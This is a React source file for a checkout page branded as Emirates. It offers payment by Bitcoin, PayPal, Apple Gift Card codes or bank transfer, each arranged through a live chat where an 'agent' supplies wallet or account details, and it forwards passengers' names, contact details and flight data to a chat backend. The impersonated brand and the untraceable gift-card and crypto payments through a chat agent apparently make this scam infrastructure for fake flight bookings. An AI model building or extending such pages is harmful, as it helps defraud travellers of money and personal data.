import { createFileRoute, useNavigate, Link } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Bitcoin, CreditCard, Gift, Landmark, Check } from "lucide-react";
import { SiteHeader } from "@/components/site-header";
import { SiteFooter } from "@/components/site-footer";
import { ChatWidget } from "@/components/chat-widget";
import { loadDraft, type BookingDraft } from "@/lib/booking";
import {
  createChatConversation,
  loadChatSession,
  saveChatSession,
} from "@/lib/chat";

export const Route = createFileRoute("/payment")({
  head: () => ({ meta: [{ title: "Payment | Emirates" }] }),
  component: PaymentPage,
});

const METHODS = [
  { id: "bitcoin", name: "Bitcoin Payment", icon: Bitcoin, desc: "Pay securely using BTC. An agent will share the wallet address." },
  { id: "paypal", name: "PayPal", icon: CreditCard, desc: "Pay via your PayPal account. Agent will share the receiving details." },
  { id: "applegift", name: "Apple Gift Card", icon: Gift, desc: "Send Apple Gift Card codes. Agent will verify and confirm." },
  { id: "banktransfer", name: "Bank Transfer", icon: Landmark, desc: "Direct bank transfer. Agent will share account details." },
] as const;

type MethodId = typeof METHODS[number]["id"];

function PaymentPage() {
  const navigate = useNavigate();
  const [draft, setDraft] = useState<BookingDraft | null>(null);
  const [method, setMethod] = useState<MethodId | null>(null);
  const [conversationId, setConversationId] = useState<string | null>(null);
  const [accessToken, setAccessToken] = useState<string | null>(null);
  const [greeting, setGreeting] = useState<string | null>(null);
  const [chatOpen, setChatOpen] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const d = loadDraft();
    if (!d || !d.passengers?.length) { navigate({ to: "/" }); return; }
    setDraft(d);
    // A chat started earlier in this browser keeps working after a reload.
    const saved = loadChatSession();
    if (saved) {
      setConversationId(saved.conversationId);
      setAccessToken(saved.accessToken);
      setGreeting(saved.greeting || null);
      const m = METHODS.find((x) => x.name === saved.paymentMethod);
      if (m) setMethod(m.id);
    }
  }, [navigate]);

  if (!draft) return null;

  const startConversation = async (m: MethodId) => {
    setMethod(m);
    setLoading(true);
    const lead = draft.passengers?.[0];
    const methodName = METHODS.find((x) => x.id === m)!.name;

    // Welcome line from the agent — shown locally in the chat, never written
    // to the database (customers cannot insert "admin" messages).
    const welcome =
      `Hello${lead?.firstName ? " " + lead.firstName : ""}! Thanks for choosing ${methodName}. ` +
      `Your booking total is US$ ${draft.totalPrice.toLocaleString()}. ` +
      `An Emirates payment specialist will be with you in a moment to share the payment details.`;

    try {
      // The chat is created through the token-gated function, never by
      // writing to the conversations table directly.
      const { id, accessToken: token } = await createChatConversation({
        customerName: lead ? `${lead.firstName} ${lead.lastName}` : null,
        customerEmail: draft.contactEmail ?? null,
        paymentMethod: methodName,
        bookingDetails: JSON.parse(JSON.stringify({
          flights: draft.selectedFlights.map((f) => ({
            no: f.flightNumber, from: f.from, to: f.to, depart: f.depart, arrive: f.arrive, price: f.price,
          })),
          passengers: draft.passengers,
          contactPhone: draft.contactPhone,
          cabin: draft.criteria.cabin,
          totalPrice: draft.totalPrice,
        })),
      });
      saveChatSession({ conversationId: id, accessToken: token, paymentMethod: methodName, greeting: welcome });
      setConversationId(id);
      setAccessToken(token);
      setGreeting(welcome);
      setChatOpen(true);
    } catch {
      alert("Could not start chat. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-muted/30">
      <SiteHeader />
      <div className="mx-auto max-w-4xl px-4 py-8">
        <Link to="/passengers" className="text-sm text-emirates hover:underline">← Back to passengers</Link>
        <h1 className="mt-2 text-3xl">Payment method</h1>
        <p className="text-sm text-muted-foreground">Select a payment method to continue.</p>

        <div className="mt-6 grid gap-4 md:grid-cols-2">
          {METHODS.map((m) => {
            const Icon = m.icon;
            const active = method === m.id;
            return (
              <button
                key={m.id}
                onClick={() => startConversation(m.id)}
                disabled={loading}
                className={`flex items-start gap-4 rounded-md border-2 bg-card p-5 text-left transition hover:border-emirates/50 ${
                  active ? "border-emirates ring-2 ring-emirates/20" : "border-border"
                }`}
              >
                <div className="flex h-12 w-12 items-center justify-center rounded-full bg-emirates/10 text-emirates">
                  <Icon className="h-6 w-6" />
                </div>
                <div className="flex-1">
                  <div className="flex items-center gap-2">
                    <h3 className="font-semibold">{m.name}</h3>
                    {active && <Check className="h-4 w-4 text-emirates" />}
                  </div>
                  <p className="mt-1 text-sm text-muted-foreground">{m.desc}</p>
                </div>
              </button>
            );
          })}
        </div>

        <div className="mt-8 rounded-md border bg-card p-6">
          <h2 className="text-lg font-semibold">Booking summary</h2>
          <ul className="mt-3 space-y-2 text-sm">
            {draft.selectedFlights.map((f) => (
              <li key={f.id} className="flex items-center justify-between border-b py-2 last:border-0">
                <span>{f.flightNumber} • {f.from} → {f.to}</span>
                <span className="text-muted-foreground">
                  {new Date(f.depart).toLocaleString([], { dateStyle: "medium", timeStyle: "short" })}
                </span>
              </li>
            ))}
          </ul>
          <div className="mt-4 flex items-center justify-between border-t pt-4">
            <span className="font-semibold">Total</span>
            <span className="text-2xl font-semibold text-emirates">US$ {draft.totalPrice.toLocaleString()}</span>
          </div>
        </div>

        {conversationId && !chatOpen && (
          <button
            onClick={() => setChatOpen(true)}
            className="fixed bottom-4 right-4 z-40 rounded-full bg-emirates px-5 py-3 text-sm font-semibold text-emirates-foreground shadow-lg hover:bg-emirates-dark"
          >
            Open chat
          </button>
        )}
      </div>

      <ChatWidget
        conversationId={conversationId}
        accessToken={accessToken}
        greeting={greeting}
        open={chatOpen}
        onClose={() => setChatOpen(false)}
        paymentMethod={METHODS.find((m) => m.id === method)?.name ?? ""}
      />

      <SiteFooter />
    </div>
  );
}
